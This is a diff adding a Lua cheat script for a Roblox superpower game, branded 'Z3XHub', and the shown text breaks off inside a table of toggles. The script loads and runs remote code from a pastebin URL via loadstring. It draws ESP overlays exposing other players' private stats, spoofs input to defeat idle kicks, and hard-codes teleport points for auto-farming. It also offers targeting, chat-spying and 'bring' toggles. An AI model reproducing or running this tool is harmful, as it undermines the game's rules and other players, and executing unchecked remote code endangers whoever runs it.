@@ -1,0 +1,2912 @@
+---@diagnostic disable: undefined-global, invalid-class-name
+repeat task.wait(0) until game:IsLoaded()
+
+local Players = game:GetService('Players')
+local LocalPlayer = Players.LocalPlayer
+local StockGravity = 196.1999969482422
+local RunService = game:GetService('RunService')
+local UserInputService = game:GetService('UserInputService')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local RemoteEvent = ReplicatedStorage.RemoteEvent
+local HttpService = game:GetService('HttpService')
+local VirtualUser = game:GetService('VirtualUser')
+local TeleportService = game:GetService('TeleportService')
+local Lighting = game:GetService('Lighting')
+local Camera = workspace.CurrentCamera
+
+for _, player in pairs(Players:GetPlayers()) do
+    task.spawn(function()
+        if player ~= LocalPlayer then
+            player:WaitForChild('LocalSoundFolder', math.huge):Destroy()
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player:WaitForChild('LocalSoundFolder', math.huge):Destroy()
+end)
+
+LocalPlayer:WaitForChild('PlayerGui', math.huge):WaitForChild('BubbleChat', math.huge).DescendantAdded:Connect(function(Descendant)
+    if Descendant:IsA('ImageLabel') then
+        Descendant.ImageColor3 = Color3.fromRGB(0,0,0)
+    elseif Descendant:IsA('TextLabel') then
+        Descendant.TextColor3 = Color3.fromRGB(255,255,255)
+    end
+end)
+
+for _, object in pairs(workspace:GetChildren()) do
+    if object.Name:match('SoulAttackBeam') and object:IsA('Beam') then
+        object:Destroy()
+    end
+end
+
+workspace.ChildAdded:Connect(function(child)
+    task.wait(.1)
+    if child.Name:match('SoulAttackBeam') and child:IsA('Beam') then
+        child:Destroy()
+    end
+end)
+
+workspace.FallenPartsDestroyHeight = math.huge - math.huge
+
+LocalPlayer.Idled:Connect(function()
+    VirtualUser:Button2Down(Vector2.new(0, 0), Camera.CFrame)
+    task.wait(1)
+    VirtualUser:Button2Up(Vector2.new(0, 0), Camera.CFrame)
+end)
+
+local Rayfield = loadstring(game:HttpGet('https://pastebin.com/raw/M1z7a7WX'))()
+Flags = Rayfield['Flags']
+
+if getgenv().Loaded then
+    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+end
+
+function round(num, numDecimalPlaces)
+    local mult = 10 ^ (numDecimalPlaces or 0)
+    local direction = numDecimalPlaces < 0 and math.ceil or math.floor
+    return direction(num * mult + 0.5) / mult
+end
+
+function converttoletter(num)
+    local roundedNum = math.floor(num * 100 + 0.5) / 100
+    if roundedNum / 1e21 >= 1 then
+        return string.format('%.2fSx', roundedNum / 1e21)
+    elseif roundedNum / 1e18 >= 1 then
+        return string.format('%.2fQi', roundedNum / 1e18)
+    elseif roundedNum / 1e15 >= 1 then
+        return string.format('%.2fQa', roundedNum / 1e15)
+    elseif roundedNum / 1e12 >= 1 then
+        return string.format('%.2fT', roundedNum / 1e12)
+    elseif roundedNum / 1e09 >= 1 then
+        return string.format('%.2fB', roundedNum / 1e09)
+    elseif roundedNum / 1e06 >= 1 then
+        return string.format('%.2fM', roundedNum / 1e06)
+    elseif roundedNum / 1e03 >= 1 then
+        return string.format('%.2fK', roundedNum / 1e03)
+    else
+        return tostring(math.floor(roundedNum))
+    end
+end
+
+local statuscolors = {
+    ['Criminal'] = Color3.new(1, 0.454902, 0.454902),
+    ['Lawbreaker'] = Color3.new(1, 0.662745, 0.388235),
+    ['Guardian'] = Color3.new(0.631373, 1, 0.631373),
+    ['Protector'] = Color3.new(1, 0.988235, 0.627451),
+    ['Supervillain'] = Color3.new(1, 0, 0),
+    ['Superhero'] = Color3.new(0, 1, 0.968627), 
+}
+
+function updateColor(status) 
+    local color = statuscolors[status]
+    if color then
+        return color
+    else
+        return Color3.new(1, 1, 1)
+    end
+end
+
+local statuscolorss = {
+    ['Criminal'] = Color3.new(0, 0, 0),
+    ['Lawbreaker'] = Color3.new(0, 0, 0),
+    ['Guardian'] = Color3.new(0, 0, 0),
+    ['Protector'] = Color3.new(0, 0, 0),
+    ['Supervillain'] = Color3.fromRGB(255, 183, 46),
+    ['Superhero'] = Color3.fromRGB(4, 30, 255),
+}
+
+function updateColorStroke(status) 
+    local color = statuscolorss[status]
+    if color then
+        return color
+    else
+        return Color3.new(0, 0, 0)
+    end
+end
+
+function formattime(_time)
+    local days = math.floor(_time / 86400)
+    local hours = math.floor(math.fmod(_time, 86400) / 3600)
+    local minutes = math.floor(math.fmod(_time, 3600) / 60)
+    local seconds = math.floor(math.fmod(_time, 60))
+    return string.format('%02dd : %02dh : %02dm : %02ds',days,hours,minutes,seconds)
+end
+
+local espfolder = Instance.new('Folder', game.CoreGui)
+espfolder.Name = 'ESPFolder'
+espfolder.ChildAdded:Connect(function(child)
+    if not Flags['Esp'] then
+        child:Destroy()
+    end
+end)
+
+function CreateESP(character, player)
+    task.spawn(function()
+        pcall(function()
+            local BillboardGui = Instance.new('BillboardGui', game.CoreGui.ESPFolder)
+            BillboardGui.Adornee = character:WaitForChild('Head', math.huge)
+            BillboardGui.ExtentsOffset = Vector3.new(0, 1, 0)
+            BillboardGui.AlwaysOnTop = true
+            BillboardGui.Size = UDim2.new(0, 2, 0, 2)
+            BillboardGui.StudsOffset = Vector3.new(0, 3, 0)
+            BillboardGui.Name = character.Name
+            
+            local frame = Instance.new('Frame', BillboardGui)
+            frame.ZIndex = 10
+            frame.BackgroundTransparency = 1
+            frame.Size = UDim2.new(5, 0, 5, 0)
+            
+            local TxtName = Instance.new('TextLabel', frame)
+            TxtName.Name = 'Names'
+            TxtName.ZIndex = 10
+            TxtName.Text = character.Name
+            TxtName.BackgroundTransparency = 1
+            TxtName.Position = UDim2.new(0, 0, 0, -55)
+            TxtName.Size = UDim2.new(1, 0, 10, 0)
+            TxtName.Font = 'GothamBold'
+            TxtName.TextSize = 14
+            TxtName.TextStrokeTransparency = 0.5
+            TxtName.TextColor3 = updateColor(player.leaderstats.Status.Value)
+            TxtName.TextStrokeColor3 = updateColorStroke(player.leaderstats.Status.Value)
+            
+            local TxtDist = Instance.new('TextLabel', frame)
+            TxtDist.Name = 'Dist'
+            TxtDist.ZIndex = 10
+            TxtDist.Text = ''
+            TxtDist.BackgroundTransparency = 1
+            TxtDist.Position = UDim2.new(0, 0, 0, -45)
+            TxtDist.Size = UDim2.new(1, 0, 10, 0)
+            TxtDist.Font = 'GothamBold'
+            TxtDist.TextColor3 = Color3.new(1, 1, 1)
+            TxtDist.TextSize = 14
+            TxtDist.TextStrokeTransparency = 0.5
+            
+            local TxtHealth = Instance.new('TextLabel', frame)
+            TxtHealth.Name = 'Health'
+            TxtHealth.ZIndex = 10
+            TxtHealth.Text = 'Health: ' .. converttoletter(character:WaitForChild('Humanoid', math.huge).Health) .. '/' .. converttoletter(character:WaitForChild('Humanoid', math.huge).MaxHealth)
+            TxtHealth.BackgroundTransparency = 1
+            TxtHealth.Position = UDim2.new(0, 0, 0, -35)
+            TxtHealth.Size = UDim2.new(1, 0, 10, 0)
+            TxtHealth.Font = 'GothamBold'
+            TxtHealth.TextColor3 = Color3.new(1, 1, 1)
+            TxtHealth.TextSize = 14
+            TxtHealth.TextStrokeTransparency = 0.5
+            
+            local TxtBody = Instance.new('TextLabel', frame)
+            TxtBody.Name = 'Body'
+            TxtBody.ZIndex = 10
+            TxtBody.BackgroundTransparency = 1
+            TxtBody.Position = UDim2.new(0, 0, 0, -25)
+            TxtBody.Size = UDim2.new(1, 0, 10, 0)
+            TxtBody.Font = 'GothamBold'
+            TxtBody.TextColor3 = Color3.new(1, 1, 1)
+            TxtBody.TextSize = 14
+            TxtBody.TextStrokeTransparency = 0.5
+            TxtBody.Text = 'Body: ' .. converttoletter(player:FindFirstChild('PrivateStats').BodyToughness.Value)
+            
+            local TxtFist = Instance.new('TextLabel', frame)
+            TxtFist.Name = 'Fist'
+            TxtFist.ZIndex = 10
+            TxtFist.BackgroundTransparency = 1
+            TxtFist.Position = UDim2.new(0, 0, 0, -15)
+            TxtFist.Size = UDim2.new(1, 0, 10, 0)
+            TxtFist.Font = 'GothamBold'
+            TxtFist.TextColor3 = Color3.new(1, 1, 1)
+            TxtFist.TextSize = 14
+            TxtFist.TextStrokeTransparency = 0.5
+            TxtFist.Text = 'Fist: ' .. converttoletter(player:FindFirstChild('PrivateStats').FistStrength.Value)
+
+            local TxtPsychic = Instance.new('TextLabel', frame)
+            TxtPsychic.Name = 'Psychic'
+            TxtPsychic.ZIndex = 10
+            TxtPsychic.BackgroundTransparency = 1
+            TxtPsychic.Position = UDim2.new(0, 0, 0, -5)
+            TxtPsychic.Size = UDim2.new(1, 0, 10, 0)
+            TxtPsychic.Font = 'GothamBold'
+            TxtPsychic.TextColor3 = Color3.new(1, 1, 1)
+            TxtPsychic.TextSize = 14
+            TxtPsychic.TextStrokeTransparency = 0.5
+            TxtPsychic.Text = 'Psychic: ' .. converttoletter(player:FindFirstChild('PrivateStats').PsychicPower.Value)
+
+            local humanoid = character:WaitForChild('Humanoid', math.huge)
+
+            TxtHealth.Text = 'Health: ' .. converttoletter(humanoid.Health) .. '/' .. converttoletter(humanoid.MaxHealth)
+
+            humanoid:GetPropertyChangedSignal('Health'):Connect(function()
+                TxtHealth.Text = 'Health: ' .. converttoletter(character.Humanoid.Health) .. '/' .. converttoletter(character.Humanoid.MaxHealth)
+                if character.Humanoid.Health <= 0 then
+                    BillboardGui:Destroy()
+                end
+            end)
+
+            while task.wait(0) and table.find(workspace:GetChildren(), character) do
+                pcall(function()
+                    TxtDist.Text = 'Distance: ' .. math.floor((LocalPlayer.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).Magnitude)     
+                end)
+            end
+        end)
+    end)
+end
+
+function CreateHighlight(character, player)
+    task.spawn(function()
+        pcall(function()
+            local Highlight = Instance.new('Highlight')
+            Highlight.Name = 'Highlight'
+            Highlight.FillTransparency = 0.5
+            Highlight.FillColor = updateColor(player:FindFirstChild('leaderstats').Status.Value)
+            Highlight.OutlineColor = updateColor(player:FindFirstChild('leaderstats').Status.Value)
+            Highlight.Parent = character
+
+            character:WaitForChild('Humanoid', math.huge):GetPropertyChangedSignal('Health'):Connect(function()
+                character.Humanoid.Died:Connect(function()
+                    local highlight = character:FindFirstChildOfClass('Highlight')
+
+                    if highlight then
+                        highlight:Destroy()
+                    end
+                end)
+            end)
+        end)
+    end)
+end
+
+task.spawn(function()
+    for i,v in pairs(game.CoreGui:GetChildren()) do 
+        if v.Name == 'Stats' then
+            v:Destroy()
+        end
+    end
+
+    local ScreenGui = Instance.new('ScreenGui')
+    local TextLabel = Instance.new('TextLabel')
+    local UICorner = Instance.new('UICorner')
+    
+    ScreenGui.Parent = game.CoreGui
+    ScreenGui.Name = 'Stats'
+    
+    TextLabel.Parent = ScreenGui
+    TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel.BackgroundTransparency = 0
+    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel.BorderSizePixel = 0   
+    TextLabel.Position = UDim2.new(0.37, 0, -0.05, 0)
+    TextLabel.Size = UDim2.new(0.27, 0, 0.03, 0)
+    TextLabel.Font = 'GothamBold'
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.TextScaled = false
+    TextLabel.TextSize = 15
+    TextLabel.TextWrapped = true
+
+    UICorner.Parent = TextLabel
+
+    local frameCount = 0
+    local startTime = tick()
+    
+    RunService.RenderStepped:Connect(function()
+        frameCount = frameCount + 1
+        if tick() - startTime >= 1 then
+            FpsCap = 'Fps: ' .. frameCount
+            Ping = 'Ping: ' .. math.floor(tonumber(game.Stats:FindFirstChild('PerformanceStats').Ping:GetValue()))
+            TextLabel.Text = 'Z3XHub ┃ Release ┃ ' .. FpsCap .. ' ┃ ' .. Ping .. ' ┃ ' .. os.date('%H:%M:%S', os.time())
+            frameCount = 0
+            startTime = tick()
+        end
+    end)  
+end)
+
+function getfs()
+    if LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value >= 1e13 then
+        return {'+FS6'}
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value >= 1e11 then
+        return {'+FS5'}
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value >= 1e9 then
+        return {'+FS4'}
+    else
+        return {'+FS3', '+FS2', '+FS1'}
+    end
+end
+
+function getpp()
+    if LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e15 then
+        return {'+PP6'}
+    elseif LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e12 then
+        return {'+PP5'}
+    elseif LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e9 then
+        return {'+PP4'}
+    elseif LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e6 then
+        return {'+PP3'}
+    else
+        return {'+PP2', '+PP1'}
+    end
+end
+
+function getfspos()
+    if LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value >= 1e13 then
+        return -364.097198, 15735.1455, -7.32395744
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value >= 1e11 then
+        return 1380.3583984375, 9273.736328125, 1652.6295166015625
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value >= 1e9 then
+        return 1175.2962646484375, 4789.25341796875, -2293.052978515625
+    end
+end
+
+function getbtpos()
+    if LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e13 then
+        return -278.3638916015625, 281.3877868652344, 1005.1320190429688
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e11 then
+        return -275.5314025878906, 281.6444396972656, 991.4784545898438
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e9 then
+        return -244.4465789794922, 287.1148986816406, 978.9732666015625
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e7 then
+        return -2024.790283203125, 714.248779296875, -1882.2078857421875
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e6 then
+        return -2297.46484375, 976.7352294921875, 1075.0213623046875
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e5 then
+        return 1634.4921875, 259.62298583984375, 2248.2060546875
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e4 then
+        return 357.2840881347656, 263.7413635253906, -492.33245849609375
+    elseif LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value >= 1e2 then
+        return 367.770751953125, 249.7052459716797, -444.747802734375
+    end
+end
+
+function getpppos()
+    if LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e15 then
+        return -2545.082763671875, 5412.32958984375, -491.8777160644531
+    elseif LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e12 then
+        return -2581.781005859375, 5516.38818359375, -500.4078674316406
+    elseif LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e9 then
+        return -2561.86328125, 5500.8828125, -440.46112060546875
+    elseif LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value >= 1e6 then
+        return -2529.778076171875, 5486.39208984375, -534.6697998046875
+    end
+end
+
+function getball()
+    if LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e15 then
+        return 'EnergySphere9'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e12 then
+        return 'EnergySphere8'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e10 then
+        return 'EnergySphere7'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e8 then
+        return 'EnergySphere6'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e7 then
+        return 'EnergySphere5'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e6 then
+        return 'EnergySphere4'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e5 then
+        return 'EnergySphere3'
+    elseif LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value > 1e4 then
+        return 'EnergySphere2'
+    else
+        return 'EnergySphere1'
+    end
+end
+
+local animations = {
+    ['bubbly'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=910004836'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=910009958'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=910034870'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=910025107'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=910016857'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=910001910'},
+        {'swimidle', 'SwimIdle', 'http://www.roblox.com/asset/?id=910030921'},
+        {'swim', 'Swim', 'http://www.roblox.com/asset/?id=910028158'}
+    },
+    ['astronaut'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=891621366'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=891633237'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=891667138'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=891636393'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=891627522'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=891609353'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=891617961'}
+    },
+    ['cartoony'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=742637544'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=742638445'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=742640026'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=742638842'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=742637942'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=742636889'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=742637151'}
+    },
+    ['elder'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=845397899'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=845400520'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=845403856'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=845386501'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=845398858'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=845392038'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=845396048'}
+    },
+    ['knight'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=657595757'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=657568135'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=657552124'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=657564596'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=658409194'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=658360781'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=657600338'}
+    },
+    ['levitation'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=616006778'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=616008087'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=616013216'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=616010382'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=616008936'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=616003713'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=616005863'}
+    },
+    ['mage'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=707742142'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=707855907'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=707897309'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=707861613'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=707853694'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=707826056'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=707829716'}
+    },
+    ['ninja'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=656117400'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=656118341'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=656121766'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=656118852'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=656117878'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=656114359'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=656115606'}
+    },
+    ['pirate'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=750781874'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=750782770'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=750785693'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=750783738'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=750782230'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=750779899'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=750780242'}
+    },
+    ['robot'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=616088211'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=616089559'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=616095330'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=616091570'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=616090535'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=616086039'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=616087089'}
+    },
+    ['stylish'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=616136790'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=616138447'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=616146177'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=616140816'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=616139451'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=616133594'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=616134815'}
+    },
+    ['superhero'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=616111295'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=616113536'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=616122287'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=616117076'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=616115533'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=616104706'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=616108001'}
+    },
+    ['toy'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=782841498'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=782845736'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=782843345'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=782842708'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=782847020'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=782843869'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=782846423'}
+    },
+    ['vampire'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=1083445855'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=1083450166'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=1083473930'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=1083462077'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=1083455352'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=1083439238'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=1083443587'}
+    },
+    ['werewolf'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=1083195517'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=1083214717'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=1083178339'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=1083216690'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=1083218792'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=1083182000'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=1083189019'}
+    },
+    ['zombie'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=616158929'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=616160636'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=616168032'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=616163682'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=616161997'},
+        {'climb', 'ClimbAnim', 'http://www.roblox.com/asset/?id=616156119'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=616157476'}
+    },
+    ['ghost'] = {
+        {'idle', 'Animation1', 'http://www.roblox.com/asset/?id=616006778'},
+        {'idle', 'Animation2', 'http://www.roblox.com/asset/?id=616008087'},
+        {'walk', 'WalkAnim', 'http://www.roblox.com/asset/?id=616013216'},
+        {'run', 'RunAnim', 'http://www.roblox.com/asset/?id=616013216'},
+        {'jump', 'JumpAnim', 'http://www.roblox.com/asset/?id=616008936'},
+        {'fall', 'FallAnim', 'http://www.roblox.com/asset/?id=616005863'},
+        {'swimidle', 'SwimIdle', 'http://www.roblox.com/asset/?id=616012453'},
+        {'swim', 'Swim', 'http://www.roblox.com/asset/?id=616011509'}
+    }
+}
+
+local Window = Rayfield:CreateWindow({
+    Name = 'Z3XHub',
+    LoadingTitle = 'Z3XHub',
+    LoadingSubtitle = 'by wer4er',
+})
+
+Farm = Window:CreateTab('Farm', 7733674079)
+Farm:CreateSection('Farm')
+Visual = Window:CreateTab('Visual', 7733919881)
+Visual:CreateSection('Visual')
+Usual = Window:CreateTab('Usual', 7734068321)
+Usual:CreateSection('Usual')
+Pvp = Window:CreateTab('Pvp', 7734058599)
+Pvp:CreateSection('Pvp')
+Teleports = Window:CreateTab('Teleports', 7734020989)
+Teleports:CreateSection('Teleports')
+Fun = Window:CreateTab('Fun', 7734059095)
+Fun:CreateSection('Fun')
+Server = Window:CreateTab('Server', 8997386997)
+Server:CreateSection('Server')
+Settings = Window:CreateTab('Settings', 7734053495)
+Settings:CreateSection('Settings')
+
+local targets = {}
+local target = LocalPlayer.Name
+
+Pvp:CreateInput({
+    Name = 'Targets',
+    PlaceholderText = 'Nickname',
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Value)
+        for _, v in pairs(Players:GetPlayers()) do
+            if string.find(string.lower(v.Name), string.lower(Value)) then
+                target = v.Name
+                break
+            end
+        end
+        Rayfield:Notify({
+            Title = 'Selected',
+            Content = target,
+            Duration = 5,
+         })
+    end,
+ })
+
+Pvp:CreateButton({
+    Name = 'Add',
+    Callback = function()
+        if Players:FindFirstChild(target) then
+            if not table.find(targets, target) then
+                table.insert(targets, target)
+            end
+        end
+        Rayfield:Notify({
+            Title = 'Targets',
+            Content = table.concat(targets, ', '),
+            Duration = 5,
+        })
+    end,
+})
+
+Pvp:CreateButton({
+    Name = 'Remove',
+    Callback = function()
+        if table.find(targets, target) then
+            for _, v in pairs(targets) do
+                if v == target then
+                    table.remove(targets, i)
+                end
+            end
+        end
+        Rayfield:Notify({
+            Title = 'Targets',
+            Content = table.concat(targets, ', '),
+            Duration = 5,
+        })
+    end,
+})
+
+Pvp:CreateButton({
+    Name = 'Clear',
+    Callback = function()
+        targets = {}
+        Rayfield:Notify({
+            Title = 'Targets',
+            Content = table.concat(targets, ', '),
+            Duration = 5,
+        })
+    end,
+})
+
+local Toggls = {
+    Fist = Farm:CreateToggle({Name = 'Fist Strength', CurrentValue = false, Flag = 'Fist'}),
+    Body = Farm:CreateToggle({Name = 'Body Toughness', CurrentValue = false, Flag = 'Body'}),
+    Psychic = Farm:CreateToggle({Name = 'Psychic Power', CurrentValue = false, Flag = 'Psychic'}),
+    JumpSpeed = Farm:CreateToggle({Name = 'Jump & Speed', CurrentValue = false, Flag = 'JumpSpeed'}),
+    Esp = Visual:CreateToggle({Name = 'Esp', CurrentValue = false, Flag = 'Esp'}),
+    Highlights = Visual:CreateToggle({Name = 'Highlights', CurrentValue = false, Flag = 'Highlights'}),
+    DayNight = Visual:CreateToggle({Name = 'Day/Night', CurrentValue = false, Flag = 'DayNight'}),
+    SuperAura = Usual:CreateToggle({Name = 'Auto Super Aura', CurrentValue = false, Flag = 'AutoSuperAura'}),
+    OffAura = Usual:CreateToggle({Name = 'Auto Disable Aura', CurrentValue = false, Flag = 'AutoDisableAura'}),
+    Quests = Usual:CreateToggle({Name = 'Auto Claim Quests', CurrentValue = false, Flag = 'AutoClaimQuests'}),
+    AnAura = Usual:CreateToggle({Name = 'Anti Lag', CurrentValue = false, Flag = 'AntiLag'}),
+    AnInv = Usual:CreateToggle({Name = 'Anti Invisible', CurrentValue = false, Flag = 'AntiInvisible'}),
+    ChatSPY = Usual:CreateToggle({Name = 'ChatSPY', CurrentValue = false, Flag = 'ChatSPY'}),
+    CBring = Pvp:CreateToggle({Name = 'CBring', CurrentValue = false, Flag = 'CBring'}),
